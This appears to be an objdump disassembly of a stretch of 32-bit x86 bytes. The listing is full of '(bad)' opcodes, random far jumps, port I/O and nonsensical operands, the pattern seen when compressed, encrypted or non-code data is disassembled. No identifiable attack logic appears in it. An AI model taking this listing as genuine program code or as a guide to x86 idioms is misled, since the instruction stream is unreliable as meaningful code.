  426008:	sbb    ch,BYTE PTR [ecx+0x163df251]
  42600e:	and    ch,BYTE PTR [ebp+0x6]
  426011:	test   eax,0xd9f1931b
  426016:	push   ecx
  426017:	cmp    al,0xf0
  426019:	jo     0x426079
  42601b:	outs   dx,BYTE PTR ds:[esi]
  42601c:	sub    al,0x99
  42601e:	ficom  DWORD PTR [ebx-0x3a]
  426021:	mov    DWORD PTR [ebx-0x20],esp
  426024:	sbb    dl,BYTE PTR [eax-0x606925ae]
  42602a:	add    bl,BYTE PTR [esi]
  42602c:	pop    es
  42602d:	jge    0x426055
  42602f:	pushf  
  426030:	and    DWORD PTR [esi],0x490a10b1
  426036:	mov    bh,0x54
  426038:	loop   0x425fc0
  42603a:	aaa    
  42603b:	mov    esi,0xedc8c0f5
  426040:	sbb    DWORD PTR [esi+ebp*4+0x62],edx
  426044:	xchg   ecx,eax
  426045:	stc    
  426046:	xlat   BYTE PTR ds:[ebx]
  426047:	dec    edi
  426048:	retf   
  426049:	xor    cl,bh
  42604b:	inc    eax
  42604c:	lea    esi,ds:0xd9050ab0
  426052:	or     bl,ch
  426054:	xor    esp,ebp
  426056:	(bad)  
  426057:	fmul   QWORD PTR [ecx+0x43329fa9]
  42605d:	push   edx
  42605e:	(bad)  
  42605f:	or     eax,0xe1cdf9cc
  426064:	inc    ebx
  426065:	stos   BYTE PTR es:[edi],al
  426066:	sti    
  426067:	mov    dl,0x9b
  426069:	data16 xchg BYTE PTR [eax],cl
  42606c:	int    0xa6
  42606e:	scas   eax,DWORD PTR es:[edi]
  42606f:	sbb    al,0x78
  426071:	loopne 0x426045
  426073:	xor    esp,esp
  426075:	and    eax,0x244f34e2
  42607a:	jmp    0x4c36:0xcba27d75
  426081:	xchg   ebp,eax
  426082:	cmp    eax,ebp
  426084:	pop    ds
  426085:	js     0x42605f
  426087:	mov    esi,0x12bf5924
  42608c:	sbb    BYTE PTR [eax*2+0x1c30653a],bl
  426093:	mov    esp,esp
  426095:	jno    0x4260e3
  426097:	mov    BYTE PTR ds:0x4c2cbbb4,ah
  42609d:	imul   ebx,DWORD PTR [eax+0x2e],0xe2086307
  4260a4:	je     0x4260f3
  4260a6:	mov    ds:0xe15025f3,eax
  4260ab:	repnz cdq 
  4260ad:	xchg   edi,eax
  4260ae:	mov    edi,0x7c091b06
  4260b3:	xchg   edx,eax
  4260b4:	(bad)  
  4260b5:	(bad)  
  4260b6:	outs   dx,BYTE PTR ds:[esi]
  4260b7:	xchg   DWORD PTR [ecx-0x514c6449],edx
  4260bd:	mov    cl,0x28
  4260bf:	retf   0x5d6b
  4260c2:	dec    edx
  4260c3:	dec    ecx
  4260c4:	and    edi,ecx
  4260c6:	test   ah,bl
  4260c8:	outs   dx,DWORD PTR ds:[esi]
  4260c9:	test   eax,0x88e7efb4
  4260ce:	in     al,dx
  4260cf:	sub    ebp,DWORD PTR [ecx]
  4260d1:	sbb    DWORD PTR ds:0x2b3a75e2,ebp
  4260d7:	out    0xfb,al
  4260d9:	push   es
  4260da:	add    edi,esi
  4260dc:	xchg   esi,eax
  4260dd:	dec    eax
  4260de:	jl     0x426077
  4260e0:	push   ebp
  4260e1:	call   0x17fb:0x9b3874bc
  4260e8:	add    ebx,DWORD PTR [edx+0x760f4474]
  4260ee:	ror    DWORD PTR [eax+0x34760ae6],cl
  4260f4:	pop    ss
  4260f5:	xor    DWORD PTR [edi+0x39557e43],eax
  4260fb:	ins    BYTE PTR es:[edi],dx
  4260fc:	data16 (bad) 
  4260fe:	aam    0xd7
  426100:	and    BYTE PTR [ebx-0x60],al
  426103:	rol    BYTE PTR [edx+0x1fac1333],cl
  426109:	test   eax,0xc12ed39f
  42610e:	fidiv  WORD PTR [eax+0x2ebb9b92]
  426114:	push   esp
  426115:	sbb    DWORD PTR [edx-0x70d18fa4],esp
  42611b:	dec    ch
  42611d:	push   cs
  42611e:	mov    bl,0x14
  426120:	ss mov ch,0x25
  426123:	cmc    
  426124:	xchg   ebp,eax
  426125:	dec    ecx
  426126:	enter  0xe1eb,0xfe
  42612a:	push   ebp
  42612b:	aaa    
  42612c:	pop    ds
  42612d:	mov    ecx,0x67f96313
  426132:	aas    
  426133:	xor    cl,BYTE PTR [ebp+0x63]
  426136:	jge    0x426128
  426138:	mov    ds,WORD PTR [edi+ecx*2-0x36955214]
  42613f:	les    esp,FWORD PTR ds:0xcf79aa69
  426145:	push   ds
  426146:	pop    ds
  426147:	xchg   al,cl
  426149:	push   edi
  42614a:	jg     0x42617e
  42614c:	dec    eax
  42614d:	mov    eax,ds:0x314ecdd5
  426152:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426153:	nop
  426154:	sbb    DWORD PTR [esp+edi*4],edx
  426157:	add    al,BYTE PTR [edi-0x559b42c3]
  42615d:	call   0x1931:0x38a727ae
  426164:	cmc    
  426165:	rcl    BYTE PTR [ebp+0x6d0f79ec],cl
  42616b:	mov    edx,0xa8ac111e
  426170:	xchg   esi,eax
  426171:	out    0x21,al
  426173:	add    eax,DWORD PTR [ebp+0x34]
  426176:	mov    dl,0x79
  426178:	aad    0xb2
  42617a:	add    al,0xe6
  42617c:	in     al,dx
  42617d:	push   ss
  42617e:	mov    ebx,0xea591ffb
  426183:	outs   dx,DWORD PTR ds:[esi]
  426184:	xor    BYTE PTR [ebp-0x7e],0x57
  426188:	sub    edi,esi
  42618a:	sub    al,0xd2
  42618c:	(bad)  
  42618d:	mov    ds:0x7bb5b95b,eax
  426192:	jecxz  0x4261a1
  426194:	and    ecx,DWORD PTR [ecx+0x5b19d4a1]
  42619a:	and    BYTE PTR [esi-0x3a],0x23
  42619e:	adc    esp,DWORD PTR [di]
  4261a1:	xchg   esi,eax
  4261a2:	sbb    al,0xe7
  4261a4:	pop    eax
  4261a5:	test   BYTE PTR [ecx-0x6c],0x90
  4261a9:	fprem1 
  4261ab:	fisubr DWORD PTR [ebx]
  4261ad:	repnz pop esi
  4261af:	or     esp,DWORD PTR [ecx]
  4261b1:	inc    ebp
  4261b2:	or     BYTE PTR [ecx+0x51],bh
  4261b5:	fwait
  4261b6:	jnp    0x426141
  4261b8:	xor    ch,BYTE PTR [eax]
  4261ba:	ins    DWORD PTR es:[edi],dx
  4261bb:	dec    eax
  4261bc:	mov    BYTE PTR [edi],cl
  4261be:	sub    DWORD PTR [eax-0x2f],ecx
  4261c1:	loope  0x426179
  4261c3:	mov    ah,0x13
  4261c5:	sub    al,0x98
  4261c7:	aaa    
  4261c8:	jbe    0x426178
  4261ca:	push   ebp
  4261cb:	(bad)  
  4261cc:	sbb    BYTE PTR [edi],ch
  4261ce:	or     al,0x97
  4261d0:	dec    ecx
  4261d1:	call   DWORD PTR [edx+esi*2+0x2574cd79]
  4261d8:	xchg   esi,eax
  4261d9:	mov    cl,0x2b
  4261db:	icebp  
  4261dc:	pop    esi
  4261dd:	imul   edx,DWORD PTR [eax],0x58
  4261e0:	adc    eax,0x2fc17b24
  4261e5:	sub    DWORD PTR [eax],ebp
  4261e7:	shr    BYTE PTR [ebp+0x6],cl
  4261ea:	stos   DWORD PTR es:[edi],eax
  4261eb:	and    eax,0x62e5ac16
  4261f0:	push   esi
  4261f1:	xlat   BYTE PTR ds:[ebx]
  4261f2:	xchg   ebx,eax
  4261f3:	rcr    BYTE PTR [ecx],cl
  4261f5:	inc    edi
  4261f6:	scas   al,BYTE PTR es:[edi]
  4261f7:	hlt    
  4261f8:	rcl    ecx,0x28
  4261fb:	rcl    DWORD PTR [ecx+0x43e4b627],0x8b
  426202:	sbb    dl,ch
  426204:	xchg   ebp,eax
  426205:	adc    DWORD PTR ds:0xb455b5f0,ebx
  42620b:	sub    edx,DWORD PTR [edi]
  42620d:	mov    ecx,0x58413af
  426212:	bound  ebp,QWORD PTR [ecx-0x71545a05]
  426218:	jmp    0x9738:0xf7b861e3
  42621f:	sub    eax,0xc4bed658
  426224:	retf   0x255b
  426227:	lods   eax,DWORD PTR ds:[esi]
  426228:	gs sub bh,cl
  42622b:	cld    
  42622c:	jl     0x4261f7
  42622e:	sbb    DWORD PTR [ebx-0x315dc6f],ecx
  426234:	shr    DWORD PTR [eax+0x4924f8ea],cl
  42623a:	(bad)  
  42623b:	sar    BYTE PTR [edx],1
  42623d:	mov    eax,0xa3e32e53
  426242:	mov    ebx,0x8b1e6d8f
  426247:	mov    WORD PTR [edx-0x5],fs
  42624a:	inc    edi
  42624b:	jns    0x426248
  42624d:	dec    esp
  42624e:	mov    edx,0xd696e644
  426253:	loop   0x42626a
  426255:	in     eax,0x6a
  426257:	jmp    0x3627a39d
  42625c:	imul   eax,DWORD PTR es:[ebp+0x6b92cec8],0xe2f717a6
  426267:	iret   
  426268:	test   DWORD PTR [edx+0x4fbe6eb],edi
  42626e:	ja     0x4262c2
  426270:	adc    BYTE PTR [edx],ch
  426272:	scas   al,BYTE PTR es:[edi]
  426273:	cmp    BYTE PTR [ebp+0x1b4d9f9d],bh
  426279:	inc    edi
  42627a:	lds    esi,FWORD PTR [edi+esi*2+0x9aba501]
  426281:	mov    esi,0x6fe4e974
  426286:	and    dl,BYTE PTR [ecx+0x5]
  426289:	clc    
  42628a:	mov    ecx,0xdccd06a4
  42628f:	pop    edx
  426290:	cdq    
  426291:	push   ecx
  426292:	retf   
  426293:	sbb    DWORD PTR [bp-0x4e],ecx
  426297:	push   esp
  426298:	daa    
  426299:	iret   
  42629a:	std    
  42629b:	mov    ds:0xf3960921,al
  4262a0:	mov    dh,0x26
  4262a2:	je     0x4262de
  4262a4:	sbb    esp,DWORD PTR [edx-0x22842cc5]
  4262aa:	push   ecx
  4262ab:	pushf  
  4262ac:	jp     0x42627e
  4262ae:	fdivr  QWORD PTR [ecx-0x4b47b80f]
  4262b4:	cld    
  4262b5:	sti    
  4262b6:	jae    0x426248
  4262b8:	and    eax,0x5ebb631
  4262bd:	shl    DWORD PTR [ebx],1
  4262bf:	aas    
  4262c0:	dec    edx
  4262c1:	jmp    0x6ece522
  4262c6:	jge    0x4262c2
  4262c8:	jecxz  0x42631c
  4262ca:	xchg   ebx,eax
  4262cb:	push   bp
  4262cd:	ins    BYTE PTR es:[edi],dx
  4262ce:	jl     0x4262b9
  4262d0:	xchg   esi,eax
  4262d1:	inc    ebx
  4262d2:	addr16 std 
  4262d4:	xor    ah,BYTE PTR [edi-0x56e3b173]
  4262da:	call   DWORD PTR [eax-0x2e]
  4262dd:	ins    BYTE PTR es:[edi],dx
  4262de:	into   
  4262df:	je     0x426341
  4262e1:	fwait
  4262e2:	fwait
  4262e3:	and    eax,0x7fe85f0b
  4262e8:	call   0xbd82:0x7be24918
  4262ef:	mov    ah,0xbf
  4262f1:	fistp  WORD PTR [esi]
  4262f3:	push   es
  4262f4:	inc    esi
  4262f5:	fistp  DWORD PTR [edx+0x62e1217e]
  4262fb:	jg     0x426305
  4262fd:	pusha  
  4262fe:	add    ah,al
  426300:	imul   eax,DWORD PTR [eax+0x7f69b4b9],0xffffffbb
  426307:	sbb    BYTE PTR [esi+0x49],al
  42630a:	cmp    ah,BYTE PTR [esp+esi*1+0x15]
  42630e:	ds jg  0x4262c1
  426311:	test   al,0x1
  426313:	out    dx,al
  426314:	sbb    cl,ch
  426316:	pop    edi
  426317:	loopne 0x4262da
  426319:	jmp    0xa1726608
  42631e:	imul   esp,edx,0xffffffe8
  426321:	sbb    al,0xf8
  426323:	mov    cl,0xf3
  426325:	add    ch,BYTE PTR [esi+eax*2-0x16]
  426329:	mov    al,ds:0x41e584b
  42632e:	pop    edx
  42632f:	scas   eax,DWORD PTR es:[edi]
  426330:	xchg   esp,eax
  426331:	mov    esp,0x31c66eea
  426336:	icebp  
  426337:	and    BYTE PTR [edx-0x15],ah
  42633a:	xor    eax,0xd7a0f5c2
  42633f:	pop    edi
  426340:	jmp    DWORD PTR [ebx-0x63b2afe5]
  426346:	push   0xe2360864
  42634b:	pop    esp
  42634c:	retf   
  42634d:	pop    ebx
  42634e:	mov    esp,0x410515a4
  426353:	inc    edx
  426354:	add    al,0xa1
  426356:	or     ecx,DWORD PTR [edx]
  426358:	dec    esp
  426359:	(bad)
  42635e:	mov    esp,0xb3b1e83c
  426363:	test   cl,al
  426365:	push   eax
  426366:	xlat   BYTE PTR ds:[ebx]
  426367:	adc    eax,0xb83c0ffd
  42636c:	xchg   ecx,eax
  42636d:	jl     0x42637e
  42636f:	adc    ch,ch
  426371:	pop    ebp
  426372:	ja     0x42635a
  426374:	and    al,0x69
  426376:	mov    edi,0xacebd943
  42637b:	xchg   ecx,eax
  42637c:	dec    ecx
  42637d:	mov    ds:0xc784b49b,eax
  426382:	push   edi
  426383:	test   BYTE PTR [eax-0x1d],ah
  426386:	in     al,0xf5
  426388:	sbb    DWORD PTR [ebp-0x2f198b4a],0xa9d5cf2f
  426392:	inc    eax
  426393:	jmp    0x42637b
  426395:	cmp    esi,DWORD PTR [eax]
  426397:	and    BYTE PTR [edx],0x79
  42639a:	xor    ebx,DWORD PTR [eax-0x74d0d65b]
  4263a0:	clc    
  4263a1:	fwait
  4263a2:	push   es
  4263a3:	sbb    DWORD PTR [ebp+0x16],esp
  4263a6:	scas   eax,DWORD PTR es:[edi]
  4263a7:	out    0x2c,eax
  4263a9:	sub    BYTE PTR [ecx],dl
  4263ab:	adc    al,0x16
  4263ad:	fmul   DWORD PTR [ecx+0x3d]
  4263b0:	push   edx
  4263b1:	mov    eax,ds:0xcb6514b7
  4263b6:	add    DWORD PTR [ebp+eiz*8+0x4b],esi
  4263ba:	dec    edi
  4263bb:	jmp    0x42637f
  4263bd:	scas   al,BYTE PTR es:[edi]
  4263be:	mov    ebx,0x8bf91edf
  4263c3:	push   cs
  4263c4:	xchg   esp,eax
  4263c5:	lock mov ds:0xef7e5fb7,eax
  4263cb:	js     0x4263f0
  4263cd:	stc    
  4263ce:	jne    0x426397
  4263d0:	ss jg  0x426450
  4263d3:	or     al,0x64
  4263d5:	cmp    DWORD PTR [esi],esp
  4263d7:	cmp    DWORD PTR [ebx],0xffffffd0
  4263da:	aaa    
  4263db:	aas    
  4263dc:	shl    DWORD PTR [ebp+0x667d00b8],1
  4263e2:	push   0x6e
  4263e4:	push   ebp
  4263e5:	add    al,0x2a
  4263e7:	in     eax,0x80
  4263e9:	(bad)  
  4263eb:	mov    ch,0x20
  4263ed:	mov    ecx,0x4eca29f3
  4263f2:	stc    
  4263f3:	rcl    bl,cl
  4263f5:	ror    DWORD PTR [ebx+0xb28ed0b],1
  4263fb:	mov    DWORD PTR [edi],ebx
  4263fd:	dec    eax
  4263fe:	mov    esp,0xcf9a3629
  426403:	in     al,0x23
  426405:	cmp    DWORD PTR [eax+ebx*4-0x6f],edx
  426409:	inc    esp
  42640a:	loope  0x426422
  42640c:	test   DWORD PTR [edx-0x42190cca],edx
  426412:	in     eax,dx
  426413:	xor    ecx,DWORD PTR [edi-0x408d1a17]
  426419:	mov    ebp,0x1a2becc6
  42641e:	mov    dl,0x72
  426420:	jbe    0x4263ac
  426422:	jmp    0x4263ff
  426424:	and    DWORD PTR [ebp-0x57],esp
  426427:	cs mov ch,0xf3
  42642a:	out    dx,al
  42642b:	(bad)  
  42642c:	push   ss
  42642d:	mov    ecx,0xbd74e3ff
  426432:	or     esi,esp
  426434:	pop    es
  426435:	in     al,dx
  426436:	fwait
  426437:	add    eax,0x9576f2c1
  42643c:	xor    eax,0xe1ee1c76
  426441:	pop    es
  426442:	mov    edi,0xce7cff0f
  426447:	in     al,0x3c
  426449:	mov    edi,0x8c6cff9e
  42644e:	mov    esp,0xe3a29d21
  426453:	and    eax,0xffffffba
  426456:	mov    eax,0x2f8ba270
  42645b:	cdq    
  42645c:	pop    ds
  42645d:	fnstcw WORD PTR [edx+0x29]
  426460:	pop    ebp
  426461:	pop    ebx
  426462:	sub    DWORD PTR [edi-0x5],edx
  426465:	and    al,0xb5
  426467:	(bad)  
  426468:	push   ebp
  426469:	mov    edi,0x8c61fd3c
  42646e:	push   es
  42646f:	popf   
  426470:	inc    esp
  426471:	int3   
  426472:	push   ecx
  426473:	das    
  426474:	mov    ebp,0xd3c4b936
  426479:	shr    DWORD PTR [esi],1
  42647b:	mov    ch,0xf5
  42647d:	pop    esi
  42647e:	sbb    al,0xea
  426480:	and    al,0xbb
  426482:	add    bl,bl
  426484:	out    0xa0,eax
  426486:	mov    ebx,edx
  426488:	iret   
  426489:	hlt    
  42648a:	mov    ah,0xa4
  42648c:	pop    edx
  42648d:	pop    es
  42648e:	leave  
  42648f:	addr16 xchg esi,eax
  426491:	mov    edx,0xad461c65
  426496:	cld    
  426497:	mov    ah,0x13
  426499:	push   ebp
  42649a:	mov    edi,0xb2b4746f
  42649f:	xor    al,0x20
  4264a1:	in     eax,dx
  4264a2:	shl    BYTE PTR [esi+0x727b9dd4],cl
  4264a8:	icebp  
  4264a9:	mov    ah,0x66
  4264ab:	pop    esi
  4264ac:	cmp    eax,0x807fec4a
  4264b1:	rcr    BYTE PTR [ebp+0x6c],0xde
  4264b5:	shl    BYTE PTR [edi+0xce37034],0xca
  4264bc:	cmp    eax,0x920afba7
  4264c1:	arpl   bp,dx
  4264c3:	in     al,0x1f
  4264c5:	out    dx,eax
  4264c6:	pop    esi
  4264c7:	cmp    eax,0x34b4af55
  4264cc:	xor    esi,DWORD PTR [edx+eax*4]
  4264cf:	daa    
  4264d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4264d1:	sbb    BYTE PTR [esi-0xc],0x76
  4264d5:	mov    ecx,eax
  4264d7:	pusha  
  4264d8:	fld    st(0)
  4264da:	popa   
  4264db:	jp     0x426542
  4264dd:	or     al,0xbf
  4264df:	hlt    
  4264e0:	je     0x426509
  4264e2:	rcr    BYTE PTR [eax-0x13415beb],1
  4264e8:	jno    0x426470
  4264ea:	push   edx
  4264eb:	loop   0x4264fc
  4264ed:	imul   esp,DWORD PTR [ebx-0x3e6edab9],0xffffff8e
  4264f4:	loop   0x4264e2
  4264f6:	push   esi
  4264f7:	jae    0x4264fe
  4264f9:	call   0x532a4c3f
  4264fe:	data16 arpl bp,bx
  426501:	popf   
  426502:	fsubr  QWORD PTR [ebp+eiz*1+0x6f38e65]
  426509:	dec    ebx
  42650a:	(bad)  [eax-0x5b]
  42650d:	cmp    DWORD PTR [eax+ebp*8-0x6a],ebp
  426511:	mov    ebp,0x91cc759
  426516:	xchg   al,dl
  426518:	jno    0x426580
  42651a:	cld    
  42651b:	int    0x6b
  42651d:	sahf   
  42651e:	mov    dl,0x63
  426520:	dec    ecx
  426521:	scas   eax,DWORD PTR es:[edi]
  426522:	pushf  
  426523:	mov    BYTE PTR [edi],ah
  426525:	inc    esi
  426526:	mov    eax,0x6001fa8c
  42652b:	jb     0x426587
  42652d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42652e:	dec    ebx
  42652f:	enter  0x9802,0xec
  426533:	xchg   esp,eax
  426534:	in     eax,dx
  426535:	push   0x5920a371
  42653a:	jg     0x42650d
  42653c:	into   
  42653d:	mov    ah,0x67
  42653f:	dec    edx
  426540:	and    BYTE PTR [ecx],bh
  426542:	xor    eax,0x822c5c99
  426547:	stos   DWORD PTR es:[edi],eax
  426548:	or     DWORD PTR [eax-0x10d60005],esp
  42654e:	adc    eax,esi
  426550:	aad    0xe7
  426552:	aaa    
  426553:	push   edx
  426554:	sub    DWORD PTR [ebp+edi*4-0x5a45322c],eax
  42655b:	inc    ebx
  42655c:	pop    ecx
  42655d:	inc    ecx
  42655e:	xchg   DWORD PTR [eax-0x7b4c96fc],esp
  426564:	clc    
  426565:	xor    edi,edi
  426567:	shl    DWORD PTR [edi+0x17],1
  42656a:	mov    al,0x44
  42656c:	ret    
  42656d:	add    eax,DWORD PTR es:[eax-0x1a51617b]
  426574:	sbb    ebx,edx
  426576:	pop    edi
  426577:	test   eax,0xaa7828b4
  42657c:	and    BYTE PTR [ecx+0x72],bl
  42657f:	out    0xab,al
  426581:	fld    DWORD PTR [esi+0x24]
  426584:	or     al,0x9e
  426586:	stos   DWORD PTR es:[edi],eax
  426587:	jmp    0x1dd3:0x5c7eec27
  42658e:	mov    ebx,0xb88bd766
  426593:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426594:	xchg   ah,ah
  426596:	cli    
  426597:	inc    eax
  426598:	xchg   BYTE PTR [ecx+0x1f],bh
  42659b:	lds    ecx,FWORD PTR [edx+0x5169a8d3]
  4265a1:	jnp    0x4265cb
  4265a3:	repnz push cs
  4265a5:	pop    ebp
  4265a6:	xchg   edi,eax
  4265a7:	xchg   ebx,eax
  4265a8:	gs cs popf 
  4265ab:	jmp    0x426546
  4265ad:	sbb    ebp,DWORD PTR [edi+0x5c]
  4265b0:	test   eax,0x89af50a4
  4265b5:	and    dh,BYTE PTR [esp+eax*1-0x7ecea0b7]
  4265bc:	sub    eax,0x56adb270
  4265c1:	and    DWORD PTR [edi+0x36],edi
  4265c4:	jns    0x42656e
  4265c6:	jmp    0x85f2:0xcd756290
  4265cd:	repnz cmp ch,ah
  4265d0:	adc    ecx,edx
  4265d2:	jl     0x4265ed
  4265d4:	fdivrp st(0),st
  4265d6:	(bad)  
  4265d7:	push   edx
  4265d8:	mov    bl,0xa
  4265da:	mov    dh,0x74
  4265dc:	pop    edx
  4265dd:	cmp    DWORD PTR [ecx+0x2f],0xffffffb6
  4265e1:	xor    BYTE PTR [esi+0x1e],dh
  4265e4:	rcr    eax,0xc9
  4265e7:	inc    ebx
  4265e8:	xchg   edx,eax
  4265e9:	pop    ss
  4265ea:	xor    al,0xfd
  4265ec:	pop    ss
  4265ed:	dec    ecx
  4265ee:	jle    0x426594
  4265f0:	push   ds
  4265f1:	add    al,0x75
  4265f3:	and    ecx,DWORD PTR [ebp+ebx*4+0x1b]
  4265f7:	dec    edx
  4265f8:	mov    bh,0x1f
  4265fa:	inc    eax
  4265fb:	daa    
  4265fc:	ins    BYTE PTR es:[edi],dx
  4265fd:	dec    esi
  4265fe:	ins    BYTE PTR es:[edi],dx
  4265ff:	pop    eax
  426600:	or     DWORD PTR [eax],ecx
  426602:	mov    edx,0x9e8180a4
  426607:	mov    eax,0xf474ed25
  42660c:	fsubrp st(7),st
  42660e:	add    bl,BYTE PTR fs:[edx]
  426611:	mov    DWORD PTR [edx],eax
  426613:	sbb    BYTE PTR [eax],dl
  426615:	imul   esi,ecx,0xabb6c453
  42661b:	push   esi
  42661c:	test   al,0xfa
  42661e:	xor    al,BYTE PTR [eax-0x29]
  426621:	loope  0x42660c
  426623:	xor    DWORD PTR [ebx],esp
  426625:	fstp   DWORD PTR [ecx-0x1f]
  426628:	ret    0x4bdc
  42662b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42662c:	addr16 pop ebx
  42662e:	fbstp  TBYTE PTR [ecx+0x3d30c14f]
  426634:	sub    BYTE PTR [edx-0x2b],0xf2
  426638:	mov    al,ds:0x3e01320a
  42663d:	mov    eax,ds:0x589024b3
  426642:	call   0xfa15384
  426647:	push   es
  426648:	or     ebp,DWORD PTR [edx+0x3e]
  42664b:	aad    0x92
  42664d:	stc    
  42664e:	push   ss
  42664f:	inc    ebp
  426650:	and    al,0xc9
  426652:	stc    
  426653:	xchg   edi,eax
  426654:	loope  0x426675
  426656:	xor    ah,0xbc
  426659:	pop    esi
  42665a:	push   ss
  42665b:	xchg   esi,eax
  42665c:	pop    esp
  42665d:	pop    eax
  42665e:	les    edx,FWORD PTR [ebx+ebx*4-0xa90a0b8]
  426665:	lods   al,BYTE PTR ds:[esi]
  426666:	pop    eax
  426667:	jmp    0x4265ec
  426669:	mov    edx,0x39f6c2a6
  42666e:	mov    ebx,0x779a3f8b
  426673:	xchg   BYTE PTR [ecx],bh
  426675:	or     DWORD PTR [esi],esi
  426677:	fild   QWORD PTR ds:0x8ab09f4a
  42667d:	sub    ecx,edx
  42667f:	jecxz  0x426650
  426681:	mov    al,ds:0x99486d15
  426686:	hlt    
  426687:	fdiv   DWORD PTR [edi+0x42]
  42668a:	stos   DWORD PTR es:[edi],eax
  42668b:	push   ebp
  42668c:	jle    0x426612
  42668e:	pusha  
  42668f:	pop    ebp
  426690:	cs push edi
  426692:	mov    edi,0xdba74518
  426697:	dec    ebx
  426698:	ror    DWORD PTR ds:0x3723d33e,1
  42669e:	call   0x3c5308c9
  4266a3:	call   0x3a04:0x2255c459
  4266aa:	push   edx
  4266ab:	mov    eax,0xec660efd
  4266b0:	fcom   DWORD PTR [esi-0xc337b74]
  4266b6:	jl     0x426656
  4266b8:	dec    ecx
  4266b9:	loope  0x426655
  4266bb:	int3   
  4266bc:	repz fwait
  4266be:	inc    edx
  4266bf:	(bad)  
  4266c0:	xchg   edx,eax
  4266c1:	mov    ebp,0xd26240b7
  4266c6:	mov    al,0xe4
  4266c8:	xor    DWORD PTR [eax],edi
  4266ca:	mov    edx,DWORD PTR [ebx+0x27]
  4266cd:	add    BYTE PTR ds:0x6c2021af,ch
  4266d3:	out    0xa6,al
  4266d5:	jb     0x4266c7
  4266d7:	cmp    BYTE PTR [ecx+0x3914b804],cl
  4266dd:	out    0x50,eax
  4266df:	sub    DWORD PTR [ecx-0x2d1c1329],ebx
  4266e5:	push   ebp
  4266e6:	mov    esi,0x74e2fa3c
  4266eb:	iret   
  4266ec:	inc    ecx
  4266ed:	(bad)  
  4266ee:	mov    bl,0x4
  4266f0:	jmp    0xcae8:0x85866286
  4266f7:	jmp    0xb3fa3e3e
  4266fc:	and    bh,BYTE PTR [ecx+0x5f]
  4266ff:	(bad)  
  426700:	push   ebx
  426701:	cmp    BYTE PTR [edx+0x40],cl
  426704:	arpl   WORD PTR [ebx+0x4efc0ccb],sp
  42670a:	imul   esi,DWORD PTR ds:0xc1b7d4b6,0x1e
  426711:	test   eax,0xa9073bbf
  426716:	cmp    al,0x12
  426718:	aaa    
  426719:	inc    ecx
  42671a:	sbb    dh,dl
  42671c:	xchg   ebp,eax
  42671d:	stc    
  42671e:	scas   al,BYTE PTR es:[edi]
  42671f:	lock scas eax,DWORD PTR es:[edi]
  426721:	and    eax,0x921b087a
  426726:	repz mov bh,0x7e
  426729:	push   0xffffffbc
  42672b:	push   esp
  42672c:	mov    ebx,0x95ef7cd6
  426731:	mov    bl,0x30
  426733:	icebp  
  426734:	adc    al,0xd7
  426736:	sar    BYTE PTR [ecx],cl
  426738:	sbb    BYTE PTR [ecx-0x62528b85],ch
  42673e:	lahf   
  42673f:	call   0xc79b:0xd8b9b1f
  426746:	div    BYTE PTR ds:0x9fcdde82
  42674c:	outs   dx,BYTE PTR ds:[esi]
  42674d:	fdiv   st,st(6)
  42674f:	hlt    
  426750:	xchg   esp,eax
  426751:	and    DWORD PTR [ebx+0x44],ebp
  426754:	gs mov bh,0xb9
  426757:	ret    
  426758:	inc    ebp
  426759:	and    ebx,esp
  42675b:	jmp    0x603824d2
  426760:	xor    BYTE PTR [ecx+0x1d],cl
  426763:	dec    eax
  426764:	out    dx,eax
  426765:	(bad)  
  426767:	fs in  al,0xd6
  42676a:	push   ecx
  42676b:	xchg   ebp,edx
  42676d:	pop    ss
  42676e:	cmp    eax,0x6364d8ec
  426773:	sub    ebx,DWORD PTR [ecx]
  426775:	fstp   DWORD PTR [ecx]
  426777:	shr    BYTE PTR [ebx+0x4c],0x21
  42677b:	cmp    al,0x10
  42677d:	out    0x4b,eax
  42677f:	ss (bad) 
  426781:	rcr    DWORD PTR ds:0x9e6a005e,cl
  426787:	fsub   QWORD PTR ds:0x44f16139
  42678d:	xchg   ebp,eax
  42678e:	mov    WORD PTR [ebx],ss
  426790:	or     BYTE PTR [esi+0x5a],bl
  426793:	mov    eax,0x24edbd30
  426798:	aad    0xa9
  42679a:	mov    bl,0xa4
  42679c:	sub    BYTE PTR ds:0x27a58464,dl
  4267a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4267a3:	out    0x18,eax
  4267a5:	jmp    0x4267d8
  4267a7:	pop    ecx
  4267a8:	and    BYTE PTR [ecx],ch
  4267aa:	test   BYTE PTR [eax-0x1f],ch
  4267ad:	neg    edx
  4267af:	cmp    BYTE PTR [esi+edx*4],cl
  4267b2:	pop    esp
  4267b3:	push   DWORD PTR [ecx+0x23e52903]
  4267b9:	add    BYTE PTR [eax+0x7db0a07c],dh
  4267bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4267c0:	into   
  4267c1:	jmp    0x310e:0x741ba4ba
  4267c8:	cmc    
  4267c9:	(bad)  
  4267cb:	call   0x5262e8a7
  4267d0:	and    al,0xa9
  4267d2:	stc    
  4267d3:	pop    esp
  4267d4:	jge    0x4267c9
  4267d6:	ss pop ebp
  4267d8:	es push ebx
  4267da:	in     al,dx
  4267db:	mov    esp,fs
  4267dd:	fldenv [esi-0x4e040f05]
  4267e3:	test   BYTE PTR [edi],dl
  4267e5:	cdq    
  4267e6:	pop    eax
  4267e7:	shr    DWORD PTR [ecx],0xcc
  4267ea:	cmp    dh,BYTE PTR [ecx-0x25]
  4267ed:	pop    esp
  4267ee:	ins    DWORD PTR es:[edi],dx
  4267ef:	push   ds
  4267f0:	clc    
  4267f1:	mov    ds:0xe586ccbb,al
  4267f6:	push   eax
  4267f7:	dec    edx
  4267f8:	stos   BYTE PTR es:[edi],al
  4267f9:	cmp    al,0xc
  4267fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4267fc:	ins    DWORD PTR es:[edi],dx
  4267fd:	loop   0x4267a9
  4267ff:	in     eax,dx
  426800:	repz fcmovne st,st(6)
  426803:	pop    esi
  426805:	inc    ecx
  426806:	xor    eax,0x1b9e8e3e
  42680b:	inc    ecx
  42680c:	mov    al,ds:0xce40f090
  426811:	lods   al,BYTE PTR ds:[esi]
  426812:	sub    bh,dl
  426814:	inc    ebp
